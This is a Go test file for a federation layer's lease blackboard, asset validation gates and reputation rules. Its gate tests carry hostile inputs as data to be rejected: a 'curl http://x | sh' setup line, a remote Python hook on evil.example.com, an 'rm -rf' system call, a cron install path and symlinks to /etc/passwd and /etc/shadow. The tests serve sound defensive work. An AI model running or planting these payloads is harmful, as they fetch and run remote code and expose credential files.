// federation_coverage_test.go — 联邦层覆盖率补强（v6.5 工程地板）
//
// 目标（只新增测试，不改生产代码）：
//   - blackboard.go：Release 全部分支、Transfer 全部错误路径、
//     ClaimTask 无认领时期望版本拒绝、构造默认值、并发认领不变式；
//   - gates.go：技能卡/工具包/适配器三形态验证门的表驱动用例
//     （红队对抗集 skill-card-poison / bad-tool-package / adapter-tamper 家族）；
//   - reputation.go：burst/circular/inflation/sybil/bot-pattern 五规则判定；
//   - trust.go：构造错误、事件权重钳制、报表排序 tie-break、零时钟注入。
//
// 复用 federation_test.go 中的 fixedTime/alwaysVerify/neverVerify/newTrust/envelope。
package federation

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"sync"
	"testing"
	"time"
)

// ===== blackboard.go =====

// TestBlackboard_Release_Branches Release 四条分支表驱动：
// 幂等释放 / 持有者释放 / 非持有者拒绝 / 过期租约释放。
func TestBlackboard_Release_Branches(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name        string
		setup       func(b *FederatedBlackboard, clock *time.Time)
		holder      NodeID
		wantErr     bool
		wantGone    bool // 释放后认领应消失
		wantExpired int64
		wantStale   int64
	}{
		{
			name:     "无认领时释放幂等成功",
			setup:    func(b *FederatedBlackboard, clock *time.Time) {},
			holder:   NodeID("node-a"),
			wantErr:  false,
			wantGone: true,
		},
		{
			name: "持有者释放成功",
			setup: func(b *FederatedBlackboard, clock *time.Time) {
				if _, err := b.ClaimTask("t", NodeID("node-a"), -1); err != nil {
					t.Fatal(err)
				}
			},
			holder:   NodeID("node-a"),
			wantErr:  false,
			wantGone: true,
		},
		{
			name: "非持有者释放被拒",
			setup: func(b *FederatedBlackboard, clock *time.Time) {
				if _, err := b.ClaimTask("t", NodeID("node-a"), -1); err != nil {
					t.Fatal(err)
				}
			},
			holder:    NodeID("node-b"),
			wantErr:   true,
			wantGone:  false, // 被拒写入不改变黑板状态（脏写 0）
			wantStale: 1,
		},
		{
			name: "过期租约释放幂等成功并计回收",
			setup: func(b *FederatedBlackboard, clock *time.Time) {
				if _, err := b.ClaimTask("t", NodeID("node-a"), -1); err != nil {
					t.Fatal(err)
				}
				*clock = clock.Add(2 * time.Second) // 越过 1s 租约
			},
			holder:      NodeID("node-b"), // 任意调用方均可回收过期租约
			wantErr:     false,
			wantGone:    true,
			wantExpired: 1,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			clock := fixedTime()
			b := NewFederatedBlackboard(LeaseConfig{
				Now:          func() time.Time { return clock },
				DefaultLease: time.Second,
			})
			tt.setup(b, &clock)

			err := b.Release("t", tt.holder)
			if tt.wantErr && err == nil {
				t.Fatal("期望释放被拒绝，实际成功")
			}
			if !tt.wantErr && err != nil {
				t.Fatalf("期望释放成功，实际错误: %v", err)
			}
			// 状态断言：认领是否存在
			_, err = b.ClaimTask("t", NodeID("node-x"), 0)
			if tt.wantGone && err != nil {
				t.Fatalf("释放后应可被新节点认领，实际: %v", err)
			}
			if !tt.wantGone && err == nil {
				t.Fatal("原持有者认领不应消失")
			}
			stats := b.Stats()
			if stats.LeaseExpired != tt.wantExpired {
				t.Errorf("LeaseExpired = %d, want %d", stats.LeaseExpired, tt.wantExpired)
			}
			if stats.StaleRejected != tt.wantStale {
				t.Errorf("StaleRejected = %d, want %d", stats.StaleRejected, tt.wantStale)
			}
		})
	}
}

// TestBlackboard_Transfer_Branches Transfer 全部路径表驱动：
// 无认领 / 租约过期 / CAS 冲突（错误 from）/ CAS 冲突（错误版本）/ 成功转移。
func TestBlackboard_Transfer_Branches(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name         string
		setup        func(b *FederatedBlackboard, clock *time.Time)
		from         NodeID
		to           NodeID
		expectVer    int64
		wantErr      bool
		wantHolder   NodeID
		wantVersion  int64
		wantExpired  int64
		wantStale    int64
		wantConflict int64
	}{
		{
			name:      "无存活认领时转移拒绝",
			setup:     func(b *FederatedBlackboard, clock *time.Time) {},
			from:      NodeID("node-a"),
			to:        NodeID("node-b"),
			expectVer: 1,
			wantErr:   true,
			wantStale: 1,
		},
		{
			name: "租约过期后转移拒绝并回收",
			setup: func(b *FederatedBlackboard, clock *time.Time) {
				if _, err := b.ClaimTask("t", NodeID("node-a"), -1); err != nil {
					t.Fatal(err)
				}
				*clock = clock.Add(2 * time.Second)
			},
			from:        NodeID("node-a"),
			to:          NodeID("node-b"),
			expectVer:   1,
			wantErr:     true,
			wantExpired: 1,
			wantStale:   1,
		},
		{
			name: "转移 CAS 冲突：from 不是持有者",
			setup: func(b *FederatedBlackboard, clock *time.Time) {
				if _, err := b.ClaimTask("t", NodeID("node-a"), -1); err != nil {
					t.Fatal(err)
				}
			},
			from:         NodeID("node-b"),
			to:           NodeID("node-c"),
			expectVer:    1,
			wantErr:      true,
			wantHolder:   NodeID("node-a"),
			wantVersion:  1,
			wantConflict: 1,
		},
		{
			name: "转移 CAS 冲突：版本不符",
			setup: func(b *FederatedBlackboard, clock *time.Time) {
				if _, err := b.ClaimTask("t", NodeID("node-a"), -1); err != nil {
					t.Fatal(err)
				}
			},
			from:         NodeID("node-a"),
			to:           NodeID("node-b"),
			expectVer:    99,
			wantErr:      true,
			wantHolder:   NodeID("node-a"),
			wantVersion:  1,
			wantConflict: 1,
		},
		{
			name: "合法转移：持有者变更且版本推进",
			setup: func(b *FederatedBlackboard, clock *time.Time) {
				if _, err := b.ClaimTask("t", NodeID("node-a"), -1); err != nil {
					t.Fatal(err)
				}
			},
			from:        NodeID("node-a"),
			to:          NodeID("node-b"),
			expectVer:   1,
			wantErr:     false,
			wantHolder:  NodeID("node-b"),
			wantVersion: 2,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			clock := fixedTime()
			b := NewFederatedBlackboard(LeaseConfig{
				Now:          func() time.Time { return clock },
				DefaultLease: time.Second,
			})
			tt.setup(b, &clock)

			got, err := b.Transfer("t", tt.from, tt.to, tt.expectVer)
			if tt.wantErr && err == nil {
				t.Fatal("期望转移被拒绝，实际成功")
			}
			if !tt.wantErr && err != nil {
				t.Fatalf("期望转移成功，实际错误: %v", err)
			}
			if tt.wantHolder != "" {
				if got.Holder != tt.wantHolder {
					t.Errorf("Holder = %q, want %q", got.Holder, tt.wantHolder)
				}
				if got.Version != tt.wantVersion {
					t.Errorf("Version = %d, want %d", got.Version, tt.wantVersion)
				}
			}
			stats := b.Stats()
			if stats.LeaseExpired != tt.wantExpired {
				t.Errorf("LeaseExpired = %d, want %d", stats.LeaseExpired, tt.wantExpired)
			}
			if stats.StaleRejected != tt.wantStale {
				t.Errorf("StaleRejected = %d, want %d", stats.StaleRejected, tt.wantStale)
			}
			if stats.CASConflicts != tt.wantConflict {
				t.Errorf("CASConflicts = %d, want %d", stats.CASConflicts, tt.wantConflict)
			}
		})
	}
}

// TestBlackboard_ClaimTask_NoClaimExpectVersion 无认领时携带非 0/-1 期望版本 → 拒绝。
func TestBlackboard_ClaimTask_NoClaimExpectVersion(t *testing.T) {
	t.Parallel()
	b := NewFederatedBlackboard(LeaseConfig{Now: fixedTime})
	// 任务从未被认领，调用方却声称读到版本 5 → CAS 语义拒绝（防丢失更新）
	got, err := b.ClaimTask("task-x", NodeID("node-a"), 5)
	if err == nil {
		t.Fatal("无认领时期望版本 5 应被拒绝")
	}
	if got.Version != 0 {
		t.Errorf("被拒返回值应为零值 Claim, got %+v", got)
	}
	if b.Stats().CASConflicts != 1 {
		t.Errorf("CASConflicts = %d, want 1", b.Stats().CASConflicts)
	}
	// 零值/全新认领仍可进（-1 与 0 均表示"我读到无认领"）
	if _, err := b.ClaimTask("task-x", NodeID("node-a"), 0); err != nil {
		t.Fatalf("expectVersion=0 的全新认领应成功: %v", err)
	}
}

// TestBlackboard_NewDefaults 零值配置取默认租约 30s 与真实时钟。
func TestBlackboard_NewDefaults(t *testing.T) {
	t.Parallel()
	b := NewFederatedBlackboard(LeaseConfig{})
	if b.cfg.DefaultLease != 30*time.Second {
		t.Errorf("DefaultLease = %v, want 30s", b.cfg.DefaultLease)
	}
	if b.cfg.Now == nil {
		t.Fatal("Now 时钟不应为 nil")
	}
	c, err := b.ClaimTask("t", NodeID("node-a"), -1)
	if err != nil {
		t.Fatal(err)
	}
	// 真实时钟下租约应落在 ~30s 后（宽松边界，防时钟漂移误判）
	d := time.Until(c.LeaseUntil)
	if d < 25*time.Second || d > 31*time.Second {
		t.Errorf("默认租约时长异常: %v", d)
	}
}

// TestBlackboard_ConcurrentClaims 并发认领不变式：唯一胜者 + 统计守恒 + 无脏状态。
func TestBlackboard_ConcurrentClaims(t *testing.T) {
	t.Parallel()
	b := NewFederatedBlackboard(LeaseConfig{Now: time.Now, DefaultLease: 10 * time.Second})
	const n = 32
	var wg sync.WaitGroup
	var mu sync.Mutex
	winners := make([]NodeID, 0, 4)
	errs := make([]error, 0, n)
	for i := 0; i < n; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			node := NodeID(fmt.Sprintf("node-%d", i))
			c, err := b.ClaimTask("hot-task", node, -1)
			mu.Lock()
			defer mu.Unlock()
			if err == nil {
				winners = append(winners, c.Holder)
			} else {
				errs = append(errs, err)
			}
		}(i)
	}
	wg.Wait()
	if len(winners) != 1 {
		t.Fatalf("并发认领应有唯一胜者, got %d (%v)", len(winners), winners)
	}
	if len(errs) != n-1 {
		t.Fatalf("其余 %d 个认领应被拒, got %d errors", n-1, len(errs))
	}
	stats := b.Stats()
	// 统计守恒：成功 + 拒绝 = 总请求（无丢失更新即无重复计数）
	if stats.ClaimsGranted+stats.CASConflicts != n {
		t.Fatalf("统计不守恒: granted %d + conflicts %d != %d",
			stats.ClaimsGranted, stats.CASConflicts, n)
	}
	// 脏认领 0：黑板当前持有者唯一且为胜者
	final, err := b.ClaimTask("hot-task", winners[0], 1)
	if err != nil {
		t.Fatalf("胜者按当前版本续租应成功: %v", err)
	}
	if final.Holder != winners[0] || final.Version != 1 {
		t.Fatalf("黑板状态被并发写脏: %+v", final)
	}
}

// TestSimulatePartitionRecovery_ErrorPath 时钟跨过租约 → 恢复演练转移失败路径。
func TestSimulatePartitionRecovery_ErrorPath(t *testing.T) {
	t.Parallel()
	var calls int
	clock := fixedTime()
	b := NewFederatedBlackboard(LeaseConfig{
		DefaultLease: time.Second,
		Now: func() time.Time {
			calls++
			if calls <= 1 {
				return clock // 首次认领成功（租约 1s）
			}
			return clock.Add(2 * time.Second) // 转移时租约已过期
		},
	})
	_, _, err := b.SimulatePartitionRecovery("t", NodeID("a"), NodeID("b"), 1)
	if err == nil {
		t.Fatal("转移时租约已过期应返回错误")
	}
	// 失败路径不应计入分区恢复成功数
	if b.Stats().PartitionRecovers != 0 {
		t.Errorf("失败的演练不应计入 PartitionRecovers: %+v", b.Stats())
	}
}

// TestSimulatePartitionRecovery_PerRunConflicts 多次演练各返回**单次**
// 冲突增量（修复 2026-09-28：此前返回累计值，多次演练呈 1,2,3…），
// 同时 PartitionRecovers 统计仍按 partitions 参数累加。
func TestSimulatePartitionRecovery_PerRunConflicts(t *testing.T) {
	t.Parallel()
	b := NewFederatedBlackboard(LeaseConfig{Now: func() time.Time { return fixedTime() }})
	for i := int64(1); i <= 3; i++ {
		final, conflicts, err := b.SimulatePartitionRecovery(fmt.Sprintf("t-%d", i), NodeID("a"), NodeID("b"), 2)
		if err != nil {
			t.Fatalf("第 %d 次演练失败: %v", i, err)
		}
		if final.Version != 2 {
			t.Errorf("恢复后版本应收敛到 2, got %d", final.Version)
		}
		if conflicts != 1 {
			t.Errorf("第 %d 次演练应返回单次冲突增量 1, got %d", i, conflicts)
		}
	}
	if got := b.Stats().PartitionRecovers; got != 6 {
		t.Errorf("PartitionRecovers = %d, want 6（3 次 × 2）", got)
	}
}

// ===== gates.go：SkillCard 门 =====

// TestValidateSkillCard 技能卡门表驱动：过期/完整性/验签/越权申报/申报一致性。
func TestValidateSkillCard(t *testing.T) {
	t.Parallel()
	now := fixedTime()
	validPayload := "读取并总结文本"
	validSHA := func(p string) string {
		return sha256Hex(p)
	}
	failVerify := func([]byte, string, string) error { return fmt.Errorf("坏签名") }

	tests := []struct {
		name    string
		card    SkillCard
		cfg     SkillCardGateConfig
		wantErr bool
	}{
		{
			name: "合法技能卡通过",
			card: SkillCard{
				AssetID: "sc-1", Issuer: NodeID("node-a"), Payload: validPayload,
				PayloadSHA: validSHA(validPayload), Signature: "sig",
				ValidUntil:   now.Add(time.Hour),
				Capabilities: []string{"text-summarize"},
			},
			cfg:     SkillCardGateConfig{Now: func() time.Time { return now }, ApprovedCaps: []string{"text-summarize"}},
			wantErr: false,
		},
		{
			name: "过期技能卡拒绝",
			card: SkillCard{
				AssetID: "sc-2", Payload: validPayload, PayloadSHA: validSHA(validPayload),
				ValidUntil: now.Add(-time.Minute),
			},
			cfg:     SkillCardGateConfig{Now: func() time.Time { return now }},
			wantErr: true,
		},
		{
			name: "零 ValidUntil 不判过期",
			card: SkillCard{
				AssetID: "sc-3", Payload: validPayload, PayloadSHA: validSHA(validPayload),
			},
			cfg:     SkillCardGateConfig{Now: func() time.Time { return now }},
			wantErr: false,
		},
		{
			name: "载荷与声明哈希不符拒绝",
			card: SkillCard{
				AssetID: "sc-4", Payload: validPayload, PayloadSHA: "deadbeef",
			},
			cfg:     SkillCardGateConfig{Now: func() time.Time { return now }},
			wantErr: true,
		},
		{
			name: "验签失败拒绝",
			card: SkillCard{
				AssetID: "sc-5", Payload: validPayload, PayloadSHA: validSHA(validPayload),
				Signature: "bad", ValidUntil: now.Add(time.Hour),
			},
			cfg: SkillCardGateConfig{
				Now: func() time.Time { return now }, Verify: failVerify,
			},
			wantErr: true,
		},
		{
			name: "未批准能力申报拒绝（宿主权限越界）",
			card: SkillCard{
				AssetID: "sc-6", Payload: validPayload, PayloadSHA: validSHA(validPayload),
				ValidUntil: now.Add(time.Hour), Capabilities: []string{"fs-write"},
			},
			cfg: SkillCardGateConfig{
				Now: func() time.Time { return now }, ApprovedCaps: []string{"text-summarize"},
			},
			wantErr: true,
		},
		{
			name: "载荷含执行语义但未申报 code-exec 拒绝",
			card: SkillCard{
				AssetID: "sc-7", Payload: "helper: exec(cmd)", PayloadSHA: validSHA("helper: exec(cmd)"),
				ValidUntil: now.Add(time.Hour), Capabilities: []string{"text-summarize"},
			},
			cfg: SkillCardGateConfig{
				Now: func() time.Time { return now }, ApprovedCaps: []string{"text-summarize", "code-exec"},
			},
			wantErr: true,
		},
		{
			name: "申报一致时通过",
			card: SkillCard{
				AssetID: "sc-8", Payload: "helper: exec(cmd)", PayloadSHA: validSHA("helper: exec(cmd)"),
				ValidUntil: now.Add(time.Hour), Capabilities: []string{"code-exec"},
			},
			cfg: SkillCardGateConfig{
				Now: func() time.Time { return now }, ApprovedCaps: []string{"code-exec"},
			},
			wantErr: false,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := ValidateSkillCard(&tt.card, tt.cfg)
			if tt.wantErr && err == nil {
				t.Fatal("期望校验失败，实际通过")
			}
			if !tt.wantErr && err != nil {
				t.Fatalf("期望校验通过，实际错误: %v", err)
			}
		})
	}
}

// TestValidateSkillCard_DefaultNow cfg.Now 为 nil 时取真实时钟（未来有效期通过）。
func TestValidateSkillCard_DefaultNow(t *testing.T) {
	t.Parallel()
	c := &SkillCard{
		AssetID: "sc-9", Payload: "p", PayloadSHA: sha256Hex("p"),
		ValidUntil: time.Now().Add(time.Hour),
	}
	if err := ValidateSkillCard(c, SkillCardGateConfig{}); err != nil {
		t.Fatalf("nil Now 应回退真实时钟并通过: %v", err)
	}
}

// TestCheckCapDeclaration_Patterns 申报-载荷一致性：各执行语义关键词逐一命中。
func TestCheckCapDeclaration_Patterns(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name     string
		payload  string
		caps     []string
		wantErr  bool
		wantMiss string // 期望缺失的能力申报
	}{
		{name: "exec( 需 code-exec", payload: "run: exec(x)", caps: nil, wantErr: true, wantMiss: "code-exec"},
		{name: "execute( 需 code-exec", payload: "run: execute(x)", caps: nil, wantErr: true, wantMiss: "code-exec"},
		{name: "eval( 需 code-exec", payload: "calc: eval(expr)", caps: nil, wantErr: true, wantMiss: "code-exec"},
		{name: "os.system 需 code-exec", payload: "os.system('rm -rf')", caps: nil, wantErr: true, wantMiss: "code-exec"},
		{name: "subprocess 需 code-exec", payload: "import subprocess", caps: nil, wantErr: true, wantMiss: "code-exec"},
		{name: "fs.writeFile 需 fs-write", payload: "fs.writeFile(p)", caps: nil, wantErr: true, wantMiss: "fs-write"},
		{name: "fs.appendFile 需 fs-write", payload: "fs.appendFile(p)", caps: nil, wantErr: true, wantMiss: "fs-write"},
		{name: "open w 模式需 fs-write", payload: `open(f, "w")`, caps: nil, wantErr: true, wantMiss: "fs-write"},
		{name: "net/http 需 net-access", payload: "import net/http", caps: nil, wantErr: true, wantMiss: "net-access"},
		{name: "urllib 需 net-access", payload: "import urllib", caps: nil, wantErr: true, wantMiss: "net-access"},
		{name: "requests.get 需 net-access", payload: "requests.get(url)", caps: nil, wantErr: true, wantMiss: "net-access"},
		{name: "requests.post 需 net-access", payload: "requests.post(url)", caps: nil, wantErr: true, wantMiss: "net-access"},
		{name: "纯文本无需申报", payload: "just text", caps: nil, wantErr: false},
		{name: "exec 且已申报 code-exec 通过", payload: "run: exec(x)", caps: []string{"code-exec"}, wantErr: false},
		{name: "多语义均已申报通过", payload: "exec(x) + net/http + fs.writeFile", caps: []string{"code-exec", "net-access", "fs-write"}, wantErr: false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := checkCapDeclaration(tt.payload, tt.caps)
			if tt.wantErr && err == nil {
				t.Fatal("期望申报不一致被检出")
			}
			if !tt.wantErr && err != nil {
				t.Fatalf("期望通过，实际错误: %v", err)
			}
			if tt.wantMiss != "" && err != nil {
				if !containsSubstr(err.Error(), tt.wantMiss) {
					t.Errorf("错误信息应指出缺失能力 %q: %v", tt.wantMiss, err)
				}
			}
		})
	}
}

// ===== gates.go：ToolPackage 门 =====

// TestValidateToolPackage 工具包门表驱动：未签名/工件哈希/导入越界/宿主写入/
// 符号链接逃逸/声明一致性 六项检查。
func TestValidateToolPackage(t *testing.T) {
	t.Parallel()
	artifact := []byte{0x00, 0x61, 0x73, 0x6d}
	artifactSHA := sha256HexBytes(artifact)
	tests := []struct {
		name    string
		pkg     ToolPackage
		cfg     ToolPackageGateConfig
		wantErr bool
	}{
		{
			name: "合法工具包通过",
			pkg: ToolPackage{
				Name: "p1", Signature: "sig", Artifact: artifact, ArtifactSHA: artifactSHA,
				Imports: []string{"env"},
			},
			cfg: ToolPackageGateConfig{
				SandboxDataDir: "/data/sandbox", ApprovedCaps: []string{"env"},
			},
			wantErr: false,
		},
		{
			name: "未签名拒绝（A6 签名前置）",
			pkg:  ToolPackage{Name: "p2", Signature: "  ", Artifact: artifact, ArtifactSHA: artifactSHA},
			cfg:  ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
			wantErr: true,
		},
		{
			name: "工件哈希不符拒绝",
			pkg: ToolPackage{
				Name: "p3", Signature: "sig", Artifact: artifact, ArtifactSHA: "bad",
			},
			cfg:    ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
			wantErr: true,
		},
		{
			name: "无工件时跳过哈希检查",
			pkg:  ToolPackage{Name: "p4", Signature: "sig"},
			cfg:  ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
			wantErr: false,
		},
		{
			name: "导入段越界拒绝",
			pkg: ToolPackage{
				Name: "p5", Signature: "sig", Imports: []string{"wasi_snapshot_preview1"},
			},
			cfg: ToolPackageGateConfig{
				SandboxDataDir: "/data/sandbox", ApprovedCaps: []string{"env"},
			},
			wantErr: true,
		},
		{
			name: "安装路径越界拒绝",
			pkg: ToolPackage{
				Name: "p6", Signature: "sig", InstallPath: "/etc/cron.d/evil",
			},
			cfg:    ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
			wantErr: true,
		},
		{
			name: "安装路径在沙箱内通过",
			pkg: ToolPackage{
				Name: "p7", Signature: "sig", InstallPath: "/data/sandbox/pkg/bin",
			},
			cfg:    ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
			wantErr: false,
		},
		{
			name: "符号链接逃逸拒绝",
			pkg: ToolPackage{
				Name: "p8", Signature: "sig", Symlinks: []string{"../../etc/passwd"},
			},
			cfg:    ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
			wantErr: true,
		},
		{
			name: "符号链接落在沙箱内通过",
			pkg: ToolPackage{
				Name: "p9", Signature: "sig", Symlinks: []string{"data/file"},
			},
			cfg:    ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
			wantErr: false,
		},
		{
			name: "绝对路径符号链接逃逸拒绝",
			pkg: ToolPackage{
				Name: "p10", Signature: "sig", Symlinks: []string{"/etc/shadow"},
			},
			cfg:    ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
			wantErr: true,
		},
		{
			name: "写语义未披露拒绝",
			pkg: ToolPackage{
				Name: "p11", Signature: "sig", ClaimedOps: []string{"file.write"},
				Description: "read only helper",
			},
			cfg:    ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
			wantErr: true,
		},
		{
			name: "写语义已披露通过",
			pkg: ToolPackage{
				Name: "p12", Signature: "sig", ClaimedOps: []string{"file.write"},
				Description: "this tool will write files to disk",
			},
			cfg:    ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
			wantErr: false,
		},
		{
			name: "只读声明无需披露",
			pkg: ToolPackage{
				Name: "p13", Signature: "sig", ClaimedOps: []string{"file.read"},
			},
			cfg:    ToolPackageGateConfig{SandboxDataDir: "/data/sandbox"},
			wantErr: false,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			err := ValidateToolPackage(&tt.pkg, tt.cfg)
			if tt.wantErr && err == nil {
				t.Fatal("期望校验失败，实际通过")
			}
			if !tt.wantErr && err != nil {
				t.Fatalf("期望校验通过，实际错误: %v", err)
			}
		})
	}
}

// TestWithinDirAndClean withinDir / filepath_Clean / resolveWithin 词法归一化单测。
func TestWithinDirAndClean(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name string
		dir  string
		tgt  string
		want bool
	}{
		{name: "目录自身", dir: "/data/sb", tgt: "/data/sb", want: true},
		{name: "目录下子路径", dir: "/data/sb", tgt: "/data/sb/x/y", want: true},
		{name: "前缀相似但非子目录", dir: "/data/sb", tgt: "/data/sb-evil", want: false},
		{name: "带 .. 归一化后越界", dir: "/data/sb", tgt: "/data/sb/../evil", want: false},
		{name: "重复分隔符归一化", dir: "/data//sb", tgt: "/data/sb/x", want: true},
		{name: "上级目录", dir: "/data/sb", tgt: "/data", want: false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			if got := withinDir(tt.dir, tt.tgt); got != tt.want {
				t.Errorf("withinDir(%q, %q) = %v, want %v", tt.dir, tt.tgt, got, tt.want)
			}
		})
	}
	// filepath_Clean 归一化语义（现状：丢弃前导 "/" 与根处 ".."——
	// withinDir 两侧同口径所以判定不受影响，但错误信息里路径丢失前导斜杠）
	if got := filepath_Clean("./a//b/../c/"); got != "a/c" {
		t.Errorf("filepath_Clean = %q, want a/c", got)
	}
	if got := filepath_Clean("../../x"); got != "x" {
		t.Errorf("filepath_Clean(../../x) = %q, want x（根处 .. 被丢弃）", got)
	}
	// resolveWithin：绝对路径原样归一化；相对路径拼到 base 后归一化
	if got := resolveWithin("/data/sb", "/abs/../x"); got != "x" {
		t.Errorf("resolveWithin 绝对路径 = %q, want x", got)
	}
	if got := resolveWithin("/data/sb", "a/../b"); got != "data/sb/b" {
		t.Errorf("resolveWithin 相对路径 = %q, want data/sb/b", got)
	}
}

// TestIsWriteOp 写语义关键词判定（中英文操作名）。
func TestIsWriteOp(t *testing.T) {
	t.Parallel()
	writes := []string{"file.write", "install-pkg", "create_user", "delete_row", "remove_file", "写入文件", "WRITE"}
	for _, op := range writes {
		if !isWriteOp(op) {
			t.Errorf("isWriteOp(%q) = false, want true", op)
		}
	}
	reads := []string{"file.read", "list", "查询", ""}
	for _, op := range reads {
		if isWriteOp(op) {
			t.Errorf("isWriteOp(%q) = true, want false", op)
		}
	}
	// isWriteDisclosed 与 isWriteOp 同口径
	if !isWriteDisclosed("本工具会 write 数据") {
		t.Error("描述含 write 应判定已披露")
	}
	if isWriteDisclosed("只读工具") {
		t.Error("只读描述不应判定已披露")
	}
}

// TestApprovedImports 错误信息用的批准集视图与配置同源。
func TestApprovedImports(t *testing.T) {
	t.Parallel()
	cfg := ToolPackageGateConfig{ApprovedCaps: []string{"env", "wasi"}}
	got := cfg.ApprovedImports()
	if len(got) != 2 || got[0] != "env" || got[1] != "wasi" {
		t.Errorf("ApprovedImports = %v, want [env wasi]", got)
	}
}

// ===== gates.go：ModelAdapter 门 =====

// TestValidateModelAdapter 适配器门表驱动：基座指纹/维度/溯源/tokenizer 钩子/许可证/URL。
func TestValidateModelAdapter(t *testing.T) {
	t.Parallel()
	rec := &AdapterRecord{
		BaseModelFingerprint: "fp-base", EmbeddingDim: 768, LicenseID: "Apache-2.0",
	}
	valid := func() *ModelAdapter {
		return &ModelAdapter{
			AssetID: "ad-1", OriginNode: NodeID("node-a"),
			DeclaredBase: "fp-base", WeightSHA: "fp-base", EmbeddingDim: 768,
			Provenance: []NodeID{NodeID("node-a")}, TokenizerConf: "vocab: 32k",
			LicenseID: "apache-2.0",
		}
	}
	tests := []struct {
		name    string
		mutate  func(a *ModelAdapter)
		rec     *AdapterRecord
		wantErr bool
	}{
		{name: "合法适配器通过（许可证大小写不敏感）", mutate: func(a *ModelAdapter) {}, rec: rec, wantErr: false},
		{name: "无登记记录时跳过对照检查", mutate: func(a *ModelAdapter) {}, rec: nil, wantErr: false},
		{
			name: "声明基座与登记不符拒绝",
			mutate: func(a *ModelAdapter) { a.DeclaredBase = "fp-evil"; a.WeightSHA = "fp-evil" },
			rec: rec, wantErr: true,
		},
		{
			name: "权重指纹与声明基座不符拒绝",
			mutate: func(a *ModelAdapter) { a.WeightSHA = "fp-other" },
			rec: rec, wantErr: true,
		},
		{
			name: "向量维度不符拒绝",
			mutate: func(a *ModelAdapter) { a.EmbeddingDim = 1024 },
			rec: rec, wantErr: true,
		},
		{
			name: "缺少溯源证明拒绝",
			mutate: func(a *ModelAdapter) { a.Provenance = nil },
			rec: rec, wantErr: true,
		},
		{
			name: "tokenizer 含 http 远程 py 钩子拒绝",
			mutate: func(a *ModelAdapter) { a.TokenizerConf = "hook: https://evil.example.com/x.py" },
			rec: rec, wantErr: true,
		},
		{
			name: "tokenizer 含 exec( 钩子拒绝",
			mutate: func(a *ModelAdapter) { a.TokenizerConf = "hook: exec(payload)" },
			rec: rec, wantErr: true,
		},
		{
			name: "tokenizer 含 __import__ 钩子拒绝",
			mutate: func(a *ModelAdapter) { a.TokenizerConf = "hook: __import__('os')" },
			rec: rec, wantErr: true,
		},
		{
			name: "tokenizer 含 curl|sh 钩子拒绝",
			mutate: func(a *ModelAdapter) { a.TokenizerConf = "setup: curl http://x | sh" },
			rec: rec, wantErr: true,
		},
		{
			name: "许可证与登记不符拒绝",
			mutate: func(a *ModelAdapter) { a.LicenseID = "GPL-3.0" },
			rec: rec, wantErr: true,
		},
		{
			name: "合法 URL 配置通过",
			mutate: func(a *ModelAdapter) { a.TokenizerConf = "doc: https://example.com/spec" },
			rec: rec, wantErr: false,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			a := valid()
			tt.mutate(a)
			err := ValidateModelAdapter(a, tt.rec)
			if tt.wantErr && err == nil {
				t.Fatal("期望校验失败，实际通过")
			}
			if !tt.wantErr && err != nil {
				t.Fatalf("期望校验通过，实际错误: %v", err)
			}
		})
	}
}

// TestExtractURL 配置中首个 http(s) URL 提取。
func TestExtractURL(t *testing.T) {
	t.Parallel()
	if got := extractURL("doc: https://a.example.com/x then http://b"); got != "https://a.example.com/x" {
		t.Errorf("extractURL = %q, want 首个 URL", got)
	}
	if got := extractURL("no url here"); got != "" {
		t.Errorf("无 URL 应返回空, got %q", got)
	}
}

// ===== reputation.go =====

func repEndorse(from, to NodeID, at time.Time) RepEvent {
	return RepEvent{From: from, To: to, Kind: RepEndorse, At: at}
}

// TestReputationGuard_Defaults 零值配置取默认阈值（30 节点互评簇才触发）。
func TestReputationGuard_Defaults(t *testing.T) {
	t.Parallel()
	g := NewReputationGuard(ReputationGuardConfig{})
	if g.cfg.BurstWindow != time.Minute || g.cfg.BurstLimit != 100 {
		t.Errorf("burst 默认值异常: %v/%d", g.cfg.BurstWindow, g.cfg.BurstLimit)
	}
	if g.cfg.SybilClusterMin != 30 || g.cfg.SybilReciprocal != 0.8 {
		t.Errorf("sybil 默认值异常: %d/%v", g.cfg.SybilClusterMin, g.cfg.SybilReciprocal)
	}
	if g.cfg.BotRepeatMin != 5 {
		t.Errorf("bot 默认阈值异常: %d", g.cfg.BotRepeatMin)
	}
	// 默认阈值下 100 事件/分钟不触发 burst
	base := fixedTime()
	events := make([]RepEvent, 0, 100)
	for i := 0; i < 100; i++ {
		events = append(events, repEndorse(NodeID(fmt.Sprintf("n%d", i)), "hub", base))
	}
	if verdict, _ := g.Evaluate(events); verdict != RepPass {
		t.Errorf("100 事件应通过（默认上限 100）, got %s", verdict)
	}
	// 101 事件触发 burst block
	events = append(events, repEndorse("extra", "hub", base))
	if verdict, detail := g.Evaluate(events); verdict != RepBlock {
		t.Errorf("101 事件应触发速率封禁, got %s (%s)", verdict, detail)
	}
}

